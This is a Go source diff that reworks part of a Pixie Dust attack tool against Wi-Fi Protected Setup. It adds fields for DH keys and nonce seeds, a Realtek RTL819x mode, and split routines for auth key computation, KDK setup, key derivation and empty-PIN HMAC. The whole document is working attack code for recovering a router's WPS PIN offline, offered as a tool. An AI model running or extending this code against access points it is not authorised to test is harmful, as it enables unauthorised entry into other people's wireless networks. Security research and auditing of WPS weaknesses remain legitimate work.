@@ -48,6 +48,8 @@ type pixieDustAttack struct {
 	rNonce      []byte
 	ebssid      net.HardwareAddr
 	modes       []uint8
+    auto        bool
+    isRTL819x   bool
 	m5enc       []byte
 	m7enc       []byte
 	force       bool
@@ -62,10 +64,15 @@ type pixieDustAttack struct {
     psk2        []byte
     emptyPsk    []byte
     kdk         []byte
+    dhKey       []byte
     decrypted5  []byte
     decrypted7  []byte
     eSecret1    []byte
     eSecret2    []byte
+    nonceSeed   uint32
+    s1Seed      uint32
+    s2Seed      uint32
+    foundMode   uint8
 }
 
 
@@ -89,6 +96,10 @@ func (pda *pixieDustAttack) execute() {
     pda.displayModes()
     pda.setTimeRange()
     pda.setDHSmall()
+    pda.computeAuthKey()
+    pda.setKDK()
+    pda.kdf()
+    pda.emptyPinHMAC()
     pda.displayTime()
 }
 
@@ -113,9 +124,9 @@ func (pda *pixieDustAttack) checkSmallDHKeys() {
 
 
 func (pda *pixieDustAttack) setModes() {
-    if len(pda.modes) > 0 { return }
+    if !pda.auto { return }
 
-    if pda.isRTL819xPKE() {
+    if pda.isRTL819x {
         pda.modes = append(pda.modes, rtl819x)
         return
     }
@@ -140,11 +151,16 @@ func (pda *pixieDustAttack) setDHSmall() {
 
 
 
-func (pda *pixieDustAttack) getKDK() {
-    dhKey  := computeDHKey(pda.pkr)
-	h      := hmac.New(sha256.New, dhKey)
-	h.Write(append(append(pda.eNonce, pda.ebssid...), pda.rNonce...))
-	pda.kdk = h.Sum(nil)
+func (pda *pixieDustAttack) computeAuthKey() {
+    if pda.authKey != nil { return }
+
+    if pda.dhSmall {
+        key := sha256.Sum256(pda.pke)
+        copy(pda.dhKey, key[:])
+    
+    } else if pda.isRTL819x {
+        pda.computeDHKey()
+    }
 }
 
 
@@ -155,16 +171,16 @@ func (pda *pixieDustAttack) isModeSelect(mode uint8) bool {
 
 
 
-func computeDHKey(pkr []byte) []byte {
+func (pda *pixieDustAttack) computeDHKey() {
     eKey := bytes.Repeat([]byte{0x55}, 192)
 	
-    sharedSecret, err := cryptoModExp(pkr, eKey, dhGroup5Prime)
+    sharedSecret, err := cryptoModExp(pda.pkr, eKey, dhGroup5Prime)
     if err != nil {
         utils.Abort(fmt.Sprintf("%v", err))
     }
 
-    dhkey := sha256.Sum256(sharedSecret)
-    return dhkey[:]
+    key := sha256.Sum256(sharedSecret)
+    copy(pda.dhKey, key[:])
 }
 
 
@@ -185,7 +201,20 @@ func cryptoModExp(base, power, modulus []byte) ([]byte, error) {
 
 
 
-func (pda *pixieDustAttack) keyDerivationFunction() {
+func (pda *pixieDustAttack) setKDK() {
+    h := hmac.New(sha256.New, pda.dhKey)
+    
+    h.Write(pda.eNonce)
+    h.Write(pda.ebssid)
+    h.Write(pda.rNonce)
+
+    pda.kdk = h.Sum(nil)
+}
+
+
+
+// Key Derivation Function
+func (pda *pixieDustAttack) kdf() {
 	var kdfSalt  = []byte("Wi-Fi Easy and Secure Key Derivation")
     totalLen    := wpsAuthkeyLen + wpsKeywrapkeyLen + wpsEmskLen // 80 bytes
     kdkBits     := uint32(totalLen * 8)  // 640 bits
@@ -194,8 +223,10 @@ func (pda *pixieDustAttack) keyDerivationFunction() {
     for i := 1; len(out) < totalLen; i++ {
         h := hmac.New(sha256.New, pda.kdk)
         binary.Write(h, binary.BigEndian, uint32(i))
+        
         h.Write(kdfSalt)
         binary.Write(h, binary.BigEndian, kdkBits)
+        
         out = append(out, h.Sum(nil)...)
     }
 
